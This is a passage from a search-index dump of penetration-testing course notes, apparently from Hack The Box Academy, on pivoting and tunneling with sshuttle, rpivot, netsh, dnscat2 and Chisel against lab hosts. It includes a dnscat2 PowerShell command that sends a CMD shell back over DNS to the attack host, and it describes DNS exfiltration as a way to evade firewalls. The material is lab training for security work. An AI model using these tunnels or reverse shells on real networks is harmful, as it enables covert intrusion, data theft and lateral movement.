is possible to create a profile where we can provide the configuration for our SOCKS server started by Plink on port 9050.</p> <p></p> <p>After configuring the SOCKS server for <code>127.0.0.1</code> and port 9050, we can directly start <code>mstsc.exe</code> to start an RDP session with a Windows target that allows RDP connections.</p> <p>Note: We can attempt this technique in any interactive section of this module from a personal Windows-based attack host. Once you've completed this module from a Linux-based attack host feel free to try to go back through it from a personal Windows-based attack host. Also, when spawning your target we ask you to wait for 3 - 5 minutes until the whole lab with all the configurations is set up so that the connection to your target works flawlessly.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#ssh-pivoting-with-sshuttle","title":"SSH Pivoting with Sshuttle","text":"<p>Sshuttle is another tool written in Python which removes the need to configure proxychains. However, this tool only works for pivoting over SSH and does not provide other options for pivoting over TOR or HTTPS proxy servers. <code>Sshuttle</code> can be extremely useful for automating the execution of iptables and adding pivot rules for the remote host. We can configure the Ubuntu server as a pivot point and route all of Nmap's network traffic with sshuttle using the example later in this section.</p> <p>One interesting usage of sshuttle is that we don't need to use proxychains to connect to the remote hosts. Let's install sshuttle via our Ubuntu pivot host and configure it to connect to the Windows host via RDP.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#installing-sshuttle","title":"Installing sshuttle","text":"<p>Installing sshuttle</p> <pre><code>darkinga@htb[/htb]$ sudo apt-get install sshuttle\n\nReading package lists... Done\nBuilding dependency tree... Done\nReading state information... Done\nThe following packages were automatically installed and are no longer required:\n  alsa-tools golang-1.15 golang-1.15-doc golang-1.15-go golang-1.15-src\n  golang-1.16-src libcmis-0.5-5v5 libct4 libgvm20 liblibreoffice-java\n  libmotif-common libqrcodegencpp1 libunoloader-java libxm4\n  linux-headers-5.10.0-6parrot1-common python-babel-localedata\n  python3-aiofiles python3-babel python3-fastapi python3-pydantic\n  python3-slowapi python3-starlette python3-uvicorn sqsh ure-java\nUse 'sudo apt autoremove' to remove them.\nSuggested packages:\n  autossh\nThe following NEW packages will be installed:\n  sshuttle\n0 upgraded, 1 newly installed, 0 to remove and 4 not upgraded.\nNeed to get 91.8 kB of archives.\nAfter this operation, 508 kB of additional disk space will be used.\nGet:1 https://ftp-stud.hs-esslingen.de/Mirrors/archive.parrotsec.org rolling/main amd64 sshuttle all 1.0.5-1 [91.8 kB]\nFetched 91.8 kB in 2s (52.1 kB/s) \nSelecting previously unselected package sshuttle.\n(Reading database ... 468019 files and directories currently installed.)\nPreparing to unpack .../sshuttle_1.0.5-1_all.deb ...\nUnpacking sshuttle (1.0.5-1) ...\nSetting up sshuttle (1.0.5-1) ...\nProcessing triggers for man-db (2.9.4-2) ...\nProcessing triggers for doc-base (0.11.1) ...\nProcessing 1 added doc-base file...\nScanning application launchers\nRemoving duplicate launchers or broken launchers\nLaunchers are updated\n</code></pre> <p>To use sshuttle, we specify the option <code>-r</code> to connect to the remote machine with a username and password. Then we need to include the network or IP we want to route through the pivot host, in our case, is the network 172.16.5.0/23.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#running-sshuttle","title":"Running sshuttle","text":"<p>Running sshuttle</p> <pre><code>darkinga@htb[/htb]$ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v \n\nStarting sshuttle proxy (version 1.1.0).\nc : Starting firewall manager with command: ['/usr/bin/python3', '/usr/local/lib/python3.9/dist-packages/sshuttle/__main__.py', '-v', '--method', 'auto', '--firewall']\nfw: Starting firewall with Python version 3.9.2\nfw: ready method name nat.\nc : IPv6 enabled: Using default IPv6 listen address ::1\nc : Method: nat\nc : IPv4: on\nc : IPv6: on\nc : UDP : off (not available with nat method)\nc : DNS : off (available)\nc : User: off (available)\nc : Subnets to forward through remote host (type, IP, cidr mask width, startPort, endPort):\nc :   (&lt;AddressFamily.AF_INET: 2&gt;, '172.16.5.0', 32, 0, 0)\nc : Subnets to exclude from forwarding:\nc :   (&lt;AddressFamily.AF_INET: 2&gt;, '127.0.0.1', 32, 0, 0)\nc :   (&lt;AddressFamily.AF_INET6: 10&gt;, '::1', 128, 0, 0)\nc : TCP redirector listening on ('::1', 12300, 0, 0).\nc : TCP redirector listening on ('127.0.0.1', 12300).\nc : Starting client with Python version 3.9.2\nc : Connecting to server...\nubuntu@10.129.202.64's password: \n s: Running server on remote host with /usr/bin/python3 (version 3.8.10)\n s: latency control setting = True\n s: auto-nets:False\nc : Connected to server.\nfw: setting up.\nfw: ip6tables -w -t nat -N sshuttle-12300\nfw: ip6tables -w -t nat -F sshuttle-12300\nfw: ip6tables -w -t nat -I OUTPUT 1 -j sshuttle-12300\nfw: ip6tables -w -t nat -I PREROUTING 1 -j sshuttle-12300\nfw: ip6tables -w -t nat -A sshuttle-12300 -j RETURN -m addrtype --dst-type LOCAL\nfw: ip6tables -w -t nat -A sshuttle-12300 -j RETURN --dest ::1/128 -p tcp\nfw: iptables -w -t nat -N sshuttle-12300\nfw: iptables -w -t nat -F sshuttle-12300\nfw: iptables -w -t nat -I OUTPUT 1 -j sshuttle-12300\nfw: iptables -w -t nat -I PREROUTING 1 -j sshuttle-12300\nfw: iptables -w -t nat -A sshuttle-12300 -j RETURN -m addrtype --dst-type LOCAL\nfw: iptables -w -t nat -A sshuttle-12300 -j RETURN --dest 127.0.0.1/32 -p tcp\nfw: iptables -w -t nat -A sshuttle-12300 -j REDIRECT --dest 172.16.5.0/32 -p tcp --to-ports 12300\n</code></pre> <p>With this command, sshuttle creates an entry in our <code>iptables</code> to redirect all traffic to the 172.16.5.0/23 network through the pivot host.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#traffic-routing-through-iptables-routes","title":"Traffic Routing through iptables Routes","text":"<p>Traffic Routing through iptables Routes</p> <pre><code>darkinga@htb[/htb]$ nmap -v -sV -p3389 172.16.5.19 -A -Pn\n\nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-03-08 11:16 EST\nNSE: Loaded 155 scripts for scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 11:16\nCompleted NSE at 11:16, 0.00s elapsed\nInitiating NSE at 11:16\nCompleted NSE at 11:16, 0.00s elapsed\nInitiating NSE at 11:16\nCompleted NSE at 11:16, 0.00s elapsed\nInitiating Parallel DNS resolution of 1 host. at 11:16\nCompleted Parallel DNS resolution of 1 host. at 11:16, 0.15s elapsed\nInitiating Connect Scan at 11:16\nScanning 172.16.5.19 [1 port]\nCompleted Connect Scan at 11:16, 2.00s elapsed (1 total ports)\nInitiating Service scan at 11:16\nNSE: Script scanning 172.16.5.19.\nInitiating NSE at 11:16\nCompleted NSE at 11:16, 0.00s elapsed\nInitiating NSE at 11:16\nCompleted NSE at 11:16, 0.00s elapsed\nInitiating NSE at 11:16\nCompleted NSE at 11:16, 0.00s elapsed\nNmap scan report for 172.16.5.19\nHost is up.\n\nPORT     STATE SERVICE       VERSION\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| rdp-ntlm-info: \n|   Target_Name: INLANEFREIGHT\n|   NetBIOS_Domain_Name: INLANEFREIGHT\n|   NetBIOS_Computer_Name: DC01\n|   DNS_Domain_Name: inlanefreight.local\n|   DNS_Computer_Name: DC01.inlanefreight.local\n|   Product_Version: 10.0.17763\n|_  System_Time: 2022-08-14T02:58:25+00:00\n|_ssl-date: 2022-08-14T02:58:25+00:00; +7s from scanner time.\n| ssl-cert: Subject: commonName=DC01.inlanefreight.local\n| Issuer: commonName=DC01.inlanefreight.local\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2022-08-13T02:51:48\n| Not valid after:  2023-02-12T02:51:48\n| MD5:   58a1 27de 5f06 fea6 0e18 9a02 f0de 982b\n|_SHA-1: f490 dc7d 3387 9962 745a 9ef8 8c15 d20e 477f 88cb\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 6s, deviation: 0s, median: 6s\n\n\nNSE: Script Post-scanning.\nInitiating NSE at 11:16\nCompleted NSE at 11:16, 0.00s elapsed\nInitiating NSE at 11:16\nCompleted NSE at 11:16, 0.00s elapsed\nInitiating NSE at 11:16\nCompleted NSE at 11:16, 0.00s elapsed\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 4.07 seconds\n</code></pre> <p>We can now use any tool directly without using proxychains.</p> <p>Note: When spawning your target, we ask you to wait for 3 - 5 minutes until the whole lab with all the configurations is set up so that the connection to your target works flawlessly.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#web-server-pivoting-with-rpivot","title":"Web Server Pivoting with Rpivot","text":"<p>Rpivot is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side. We will take the scenario below, where we have a web server on our internal network (<code>172.16.5.135</code>), and we want to access that using the rpivot proxy.</p> <p></p> <p>We can start our rpivot SOCKS proxy server using the below command to allow the client to connect on port 9999 and listen on port 9050 for proxy pivot connections.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#cloning-rpivot","title":"Cloning rpivot","text":"<p>Cloning rpivot</p> <pre><code>darkinga@htb[/htb]$ sudo git clone https://github.com/klsecservices/rpivot.git\n</code></pre>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#installing-python27","title":"Installing Python2.7","text":"<p>Installing Python2.7</p> <pre><code>darkinga@htb[/htb]$ sudo apt-get install python2.7\n</code></pre> <p>We can start our rpivot SOCKS proxy server to connect to our client on the compromised Ubuntu server using <code>server.py</code>.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#running-serverpy-from-the-attack-host","title":"Running server.py from the Attack Host","text":"<p>Running server.py from the Attack Host</p> <pre><code>darkinga@htb[/htb]$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0\n</code></pre> <p>Before running <code>client.py</code> we will need to transfer rpivot to the target. We can do this using this SCP command:</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#transfering-rpivot-to-the-target","title":"Transfering rpivot to the Target","text":"<p>Transfering rpivot to the Target</p> <pre><code>darkinga@htb[/htb]$ scp -r rpivot ubuntu@&lt;IpaddressOfTarget&gt;:/home/ubuntu/\n</code></pre>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#running-clientpy-from-pivot-target","title":"Running client.py from Pivot Target","text":"<p>Running client.py from Pivot Target</p> <pre><code>ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999\n\nBackconnecting to server 10.10.14.18 port 9999\n</code></pre>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#confirming-connection-is-established","title":"Confirming Connection is Established","text":"<p>Confirming Connection is Established</p> <pre><code>New connection from host 10.129.202.64, source port 35226\n</code></pre> <p>We will configure proxychains to pivot over our local server on 127.0.0.1:9050 on our attack host, which was initially started by the Python server.</p> <p>Finally, we should be able to access the webserver on our server-side, which is hosted on the internal network of 172.16.5.0/23 at 172.16.5.135:80 using proxychains and Firefox.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#browsing-to-the-target-webserver-using-proxychains","title":"Browsing to the Target Webserver using Proxychains","text":"<p>Browsing to the Target Webserver using Proxychains</p> <pre><code>proxychains firefox-esr 172.16.5.135:80\n</code></pre> <p></p> <p>Similar to the pivot proxy above, there could be scenarios when we cannot directly pivot to an external server (attack host) on the cloud. Some organizations have HTTP-proxy with NTLM authentication configured with the Domain Controller. In such cases, we can provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy by providing a username and password. In these cases, we could use rpivot's client.py in the following way:</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#connecting-to-a-web-server-using-http-proxy-ntlm-auth","title":"Connecting to a Web Server using HTTP-Proxy &amp; NTLM Auth","text":"<p>Connecting to a Web Server using HTTP-Proxy &amp; NTLM Auth</p> <pre><code>python client.py --server-ip &lt;IPaddressofTargetWebServer&gt; --server-port 8080 --ntlm-proxy-ip &lt;IPaddressofProxy&gt; --ntlm-proxy-port 8081 --domain &lt;nameofWindowsDomain&gt; --username &lt;username&gt; --password &lt;password&gt;\n</code></pre>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#port-forwarding-with-windows-netsh","title":"Port Forwarding with Windows Netsh","text":"<p>Netsh is a Windows command-line tool that can help with the network configuration of a particular Windows system. Here are just some of the networking related tasks we can use <code>Netsh</code> for:</p> <ul> <li><code>Finding routes</code></li> <li><code>Viewing the firewall configuration</code></li> <li><code>Adding proxies</code></li> <li><code>Creating port forwarding rules</code></li> </ul> <p>Let's take an example of the below scenario where our compromised host is a Windows 10-based IT admin's workstation (<code>10.129.15.150</code>,<code>172.16.5.25</code>). Keep in mind that it is possible on an engagement that we may gain access to an employee's workstation through methods such as social engineering and phishing. This would allow us to pivot further from within the network the workstation is in.</p> <p></p> <p>We can use <code>netsh.exe</code> to forward all data received on a specific port (say 8080) to a remote host on a remote port. This can be performed using the below command.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#using-netshexe-to-port-forward","title":"Using Netsh.exe to Port Forward","text":"<p>Using Netsh.exe to Port Forward</p> <pre><code>C:\\Windows\\system32&gt; netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25\n</code></pre>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#verifying-port-forward","title":"Verifying Port Forward","text":"<p>Verifying Port Forward</p> <pre><code>C:\\Windows\\system32&gt; netsh.exe interface portproxy show v4tov4\n\nListen on ipv4:             Connect to ipv4:\n\nAddress         Port        Address         Port\n--------------- ----------  --------------- ----------\n10.129.42.198   8080        172.16.5.25     3389\n</code></pre> <p>After configuring the <code>portproxy</code> on our Windows-based pivot host, we will try to connect to the 8080 port of this host from our attack host using xfreerdp. Once a request is sent from our attack host, the Windows host will route our traffic according to the proxy settings configured by netsh.exe.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#connecting-to-the-internal-host-through-the-port-forward","title":"Connecting to the Internal Host through the Port Forward","text":"<p>Note: When spawning your target, we ask you to wait for 3 - 5 minutes until the whole lab with all the configurations is set up so that the connection to your target works flawlessly.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#branching-out-our-tunnels","title":"Branching Out Our Tunnels","text":""},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#dns-tunneling-with-dnscat2","title":"DNS Tunneling with Dnscat2","text":"<p>Dnscat2 is a tunneling tool that uses DNS protocol to send data between two hosts. It uses an encrypted <code>Command-&amp;-Control</code> (<code>C&amp;C</code> or <code>C2</code>) channel and sends data inside TXT records within the DNS protocol. Usually, every active directory domain environment in a corporate network will have its own DNS server, which will resolve hostnames to IP addresses and route the traffic to external DNS servers participating in the overarching DNS system. However, with dnscat2, the address resolution is requested from an external server. When a local DNS server tries to resolve an address, data is exfiltrated and sent over the network instead of a legitimate DNS request. Dnscat2 can be an extremely stealthy approach to exfiltrate data while evading firewall detections which strip the HTTPS connections and sniff the traffic. For our testing example, we can use dnscat2 server on our attack host, and execute the dnscat2 client on another Windows host.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#setting-up-using-dnscat2","title":"Setting Up &amp; Using dnscat2","text":"<p>If dnscat2 is not already set up on our attack host, we can do so using the following commands:</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#cloning-dnscat2-and-setting-up-the-server","title":"Cloning dnscat2 and Setting Up the Server","text":"<p>Cloning dnscat2 and Setting Up the Server</p> <pre><code>darkinga@htb[/htb]$ git clone https://github.com/iagox86/dnscat2.git\n\ncd dnscat2/server/\ngem install bundler\nbundle install\n</code></pre> <p>We can then start the dnscat2 server by executing the dnscat2 file.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#starting-the-dnscat2-server","title":"Starting the dnscat2 server","text":"<p>Starting the dnscat2 server</p> <pre><code>darkinga@htb[/htb]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache\n\nNew window created: 0\ndnscat2&gt; New window created: crypto-debug\nWelcome to dnscat2! Some documentation may be out of date.\n\nauto_attach =&gt; false\nhistory_size (for new windows) =&gt; 1000\nSecurity policy changed: All connections must be encrypted\nNew window created: dns1\nStarting Dnscat2 DNS server on 10.10.14.18:53\n[domains = inlanefreight.local]...\n\nAssuming you have an authoritative DNS server, you can run\nthe client anywhere with the following (--secret is optional):\n\n  ./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local\n\nTo talk directly to the server without a domain name, run:\n\n  ./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21\n\nOf course, you have to figure out &lt;server&gt; yourself! Clients\nwill connect directly on UDP port 53.\n</code></pre> <p>After running the server, it will provide us the secret key, which we will have to provide to our dnscat2 client on the Windows host so that it can authenticate and encrypt the data that is sent to our external dnscat2 server. We can use the client with the dnscat2 project or use dnscat2-powershell, a dnscat2 compatible PowerShell-based client that we can run from Windows targets to establish a tunnel with our dnscat2 server. We can clone the project containing the client file to our attack host, then transfer it to the target.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#cloning-dnscat2-powershell-to-the-attack-host","title":"Cloning dnscat2-powershell to the Attack Host","text":"<p>Cloning dnscat2-powershell to the Attack Host</p> <pre><code>darkinga@htb[/htb]$ git clone https://github.com/lukebaggett/dnscat2-powershell.git\n</code></pre> <p>Once the <code>dnscat2.ps1</code> file is on the target we can import it and run associated cmd-lets.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#importing-dnscat2ps1","title":"Importing dnscat2.ps1","text":"<p>Importing dnscat2.ps1</p> <pre><code>PS C:\\htb&gt; Import-Module .\\dnscat2.ps1\n</code></pre> <p>After dnscat2.ps1 is imported, we can use it to establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server.</p> <p>Importing dnscat2.ps1</p> <pre><code>PS C:\\htb&gt; Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd \n</code></pre> <p>We must use the pre-shared secret (<code>-PreSharedSecret</code>) generated on the server to ensure our session is established and encrypted. If all steps are completed successfully, we will see a session established with our server.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#confirming-session-establishment","title":"Confirming Session Establishment","text":"<p>Confirming Session Establishment</p> <pre><code>New window created: 1\nSession 1 Security: ENCRYPTED AND VERIFIED!\n(the security depends on the strength of your pre-shared secret!)\n\ndnscat2&gt;\n</code></pre> <p>We can list the options we have with dnscat2 by entering <code>?</code> at the prompt.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#listing-dnscat2-options","title":"Listing dnscat2 Options","text":"<p>Listing dnscat2 Options</p> <pre><code>dnscat2&gt; ?\n\nHere is a list of commands (use -h on any of them for additional help):\n* echo\n* help\n* kill\n* quit\n* set\n* start\n* stop\n* tunnels\n* unset\n* window\n* windows\n</code></pre> <p>We can use dnscat2 to interact with sessions and move further in a target environment on engagements. We will not cover all possibilities with dnscat2 in this module, but it is strongly encouraged to practice with it and maybe even find creative ways to use it on an engagement. Let's interact with our established session and drop into a shell.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#interacting-with-the-established-session","title":"Interacting with the Established Session","text":"<p>Interacting with the Established Session</p> <pre><code>dnscat2&gt; window -i 1\nNew window created: 1\nhistory_size (session) =&gt; 1000\nSession 1 Security: ENCRYPTED AND VERIFIED!\n(the security depends on the strength of your pre-shared secret!)\nThis is a console session!\n\nThat means that anything you type will be sent as-is to the\nclient, and anything they type will be displayed as-is on the\nscreen! If the client is executing a command and you don't\nsee a prompt, try typing 'pwd' or something!\n\nTo go back, type ctrl-z.\n\nMicrosoft Windows [Version 10.0.18363.1801]\n(c) 2019 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt;\nexec (OFFICEMANAGER) 1&gt;\n</code></pre>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#socks5-tunneling-with-chisel","title":"SOCKS5 Tunneling with Chisel","text":"<p>Chisel is a TCP/UDP-based tunneling tool written in Go that uses HTTP to transport data that is secured using SSH. <code>Chisel</code> can create a client-server tunnel connection in a firewall restricted environment. Let us consider a scenario where we have to tunnel our traffic to a webserver on the <code>172.16.5.0</code>/<code>23</code> network (internal network). We have the Domain Controller with the address <code>172.16.5.19</code>. This is not directly accessible to our attack host since our attack host and the domain controller belong to different network segments. However, since we have compromised the Ubuntu server, we can start a Chisel server on it that will listen on a specific port and forward our traffic to the internal network through the established tunnel.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#setting-up-using-chisel","title":"Setting Up &amp; Using Chisel","text":"<p>Before we can use Chisel, we need to have it on our attack host. If we do not have Chisel on our attack host, we can clone the project repo using the command directly below:</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#cloning-chisel","title":"Cloning Chisel","text":"<p>Cloning Chisel</p> <pre><code>darkinga@htb[/htb]$ git clone https://github.com/jpillora/chisel.git\n</code></pre> <p>We will need the programming language <code>Go</code> installed on our system to build the Chisel binary. With Go installed on the system, we can move into that directory and use <code>go build</code> to build the Chisel binary.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#building-the-chisel-binary","title":"Building the Chisel Binary","text":"<p>Building the Chisel Binary</p> <pre><code>darkinga@htb[/htb]$ cd chisel\ngo build\n</code></pre> <p>It can be helpful to be mindful of the size of the files we transfer onto targets on our client's networks, not just for performance reasons but also considering detection. Two beneficial resources to complement this particular concept are Oxdf's blog post \"Tunneling with Chisel and SSF\" and IppSec's walkthrough of the box <code>Reddish</code>. IppSec starts his explanation of Chisel, building the binary and shrinking the size of the binary at the 24:29 mark of his video.</p> <p>Once the binary is built, we can use <code>SCP</code> to transfer it to the target pivot 